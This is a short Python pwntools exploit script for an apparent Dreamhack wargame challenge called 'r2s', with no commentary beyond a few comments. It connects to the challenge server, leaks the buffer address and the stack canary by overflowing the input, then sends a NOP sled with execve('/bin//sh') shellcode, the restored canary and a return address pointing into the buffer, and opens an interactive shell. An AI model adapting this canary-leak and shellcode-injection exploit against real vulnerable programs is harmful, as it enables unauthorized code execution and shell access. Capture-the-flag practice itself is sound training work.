from pwn import *

# p = process("./r2s")
# nc host1.dreamhack.games 1898
p = remote("host1.dreamhack.games", 18989)

p.recvuntil("Address of the buf: ")
buf_addr = int(p.recv(14), 16)
print(hex(buf_addr))

p.recvuntil("Input: ")
pay_can = b""
pay_can += b"A" * 89
p.send(pay_can)

p.recvuntil("A" * 88)
canary = u64(p.recv(8)) - ord("A")

print(hex(canary))

input()

pay = b""
pay += b"\x90" * 20
pay += b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
pay += b"\x90" * (88 - len(pay))
pay += p64(canary)
pay += b"XXXXXXXX"
pay += p64(buf_addr)

p.sendline(pay)

p.interactive()